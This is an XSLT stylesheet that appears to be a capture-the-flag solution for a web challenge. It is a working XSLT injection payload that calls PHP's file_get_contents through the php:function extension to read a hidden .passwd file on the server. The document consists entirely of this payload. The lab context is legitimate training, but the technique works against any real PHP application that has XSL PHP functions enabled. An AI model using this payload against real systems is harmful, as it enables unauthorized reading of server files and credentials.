<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:for-each select="beers">
        <xsl:value-of select="php:function('file_get_contents', '/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')"/>
</xsl:for-each>
</html>